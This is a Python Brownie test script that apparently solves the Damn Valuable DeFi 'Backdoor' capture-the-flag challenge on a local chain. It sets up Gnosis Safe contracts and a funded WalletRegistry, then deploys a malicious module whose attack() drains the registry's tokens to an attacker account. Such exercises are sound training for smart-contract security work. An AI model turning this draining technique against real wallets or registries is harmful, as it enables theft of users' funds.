from pathlib import Path
from brownie import ZERO_ADDRESS, accounts, WalletRegistry, DamnValuableToken, project, Wei
import web3
import eth_account


def test_backdoor():
    before()
    exploit()
    after()
    
    
def before():
    DEPLOYER = accounts[-1]
    new_account = eth_account.Account().create()
    global attacker_key
    attacker_key = new_account.privateKey.hex()
    print(f"attacker address: {new_account.address}, private key: {attacker_key}")
    global ATTACKER
    # Creating new account,you can access the priv key of this account
    # using the ATTACKER object if you need to (hint: not necessary to solve)
    ATTACKER = accounts.add(attacker_key)
    new_account = accounts.add()
     
    
    
    global wallet_users
    wallet_users = [accounts[0], accounts[1], accounts[2], accounts[3]]
    gnosis_package_path = Path(Path.home()/ ".brownie" /"packages"/"curiousdweller"/"safe-contracts@1.3.0")
    # Load the gnosis contracts for use
    global Gnosis
    Gnosis = project.load(gnosis_package_path)
    global GnosisSafe
    GnosisSafe = Gnosis.GnosisSafe
    global GnosisSafeProxyFactory
    GnosisSafeProxyFactory = Gnosis.GnosisSafeProxyFactory
    # Deploy Gnosis contracts
    gnosis_safe = GnosisSafe.deploy({"from": DEPLOYER})
    gnosis_safe_proxy_factory = GnosisSafeProxyFactory.deploy({"from": DEPLOYER})
    
    dv_token = DamnValuableToken.deploy({"from": DEPLOYER})
    wallet_registry = WalletRegistry.deploy(gnosis_safe.address,
                                            gnosis_safe_proxy_factory.address,
                                            dv_token.address,
                                            wallet_users,
                                            {"from": DEPLOYER})
    for i in wallet_users:
        assert wallet_registry.beneficiaries(i.address) == True
    dv_token.transfer(wallet_registry.address, Wei("40 ether"), {"from": DEPLOYER})
    assert dv_token.balanceOf(wallet_registry.address) == Wei("40 ether")
    
    
    
def exploit():
    
    from brownie import maliciousModule

    malicious_contract = maliciousModule.deploy(GnosisSafe[-1].address, GnosisSafeProxyFactory[-1].address, DamnValuableToken[-1].address, wallet_users[0].address, WalletRegistry[-1].address, ATTACKER, {"from": ATTACKER})

    print("--- prep malicious contract and tests ---")

    tx = malicious_contract.attack(wallet_users)
    return_attack = tx.return_value
    print(f"return_attack: {return_attack}")

    print(f'balance attacke in DVT token BEFORE: {DamnValuableToken[-1].balanceOf(ATTACKER)}')

    print("--- ATTACK phase ---")

    # request the creation of a new proxy, using the call back function which will call the proxyCreated() function of the malicious contract instead of the registry
    
    # initializer = GnosisSafe[-1].setup.encode_input(wallet_users, 1, malicious_contract.address, '', malicious_contract.address, '0x0000000000000000000000000000000000000000', 0, '0x0000000000000000000000000000000000000000')
    # print(f"initialyzer: {initializer}")

    real_proxy_created = tx.return_value
    print(f"factory address: : {GnosisSafeProxyFactory[-1].address}")
    print(f"gnosis master address: : {GnosisSafe[-1].address}")
    print(f"malicious address: : {malicious_contract.address}")
    print(f"real_proxy_created: : {real_proxy_created}")
    print(f"registry address: : {WalletRegistry[-1].address}")

    print(f'balance attacke in DVT token AFTER: {DamnValuableToken[-1].balanceOf(malicious_contract)}')


def after():
    assert DamnValuableToken[-1].balanceOf(ATTACKER) >= Wei("39 ether")
    